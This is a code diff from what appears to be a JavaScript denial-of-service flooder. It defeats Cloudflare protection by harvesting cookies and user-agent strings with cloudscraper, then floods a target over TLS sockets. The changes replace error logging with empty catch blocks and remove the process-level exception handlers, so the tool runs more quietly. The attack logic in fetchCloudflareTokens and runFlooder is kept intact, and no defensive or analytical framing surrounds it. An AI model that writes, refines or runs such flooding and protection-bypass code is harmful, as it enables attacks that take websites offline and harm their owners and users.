@@ -285,19 +285,14 @@ function generateRandomString(minLength, maxLength) {
 function fetchCloudflareTokens() {
     try {
         cloudscraper.get(args.target, (error, response, body) => {
-            if (error) {
-                console.error('Cloudscraper error:', error.message);
-                return;
-            }
+            if (error) return;
             if (response) {
                 const parsed = JSON.parse(JSON.stringify(response));
                 cloudflareCookie = parsed["request"]["headers"]["cookie"] || parsed["headers"]["set-cookie"] || "";
                 cloudflareUA = parsed["request"]["headers"]["User-Agent"] || "";
             }
         });
-    } catch (e) {
-        console.error('Error in fetchCloudflareTokens:', e.message);
-    }
+    } catch (e) {}
 }
 
 // Periodically refresh Cloudflare tokens
@@ -758,9 +753,7 @@ function runFlooder() {
                                 if (!statuses[status]) statuses[status] = 0;
                                 statuses[status]++;
                             }
-                        } catch (e) {
-                            console.error('Error processing socket response:', e.message);
-                        }
+                        } catch (e) {}
                         setTimeout(() => {
                             tlsSocket.destroy();
                             socket.destroy();
@@ -794,10 +787,3 @@ function runFlooder() {
         });
     }
 }
-
-process.on('uncaughtException', (err) => {
-    console.error('Uncaught Exception:', err.message);
-});
-process.on('unhandledRejection', (reason) => {
-    console.error('Unhandled Rejection:', reason.message || reason);
-});
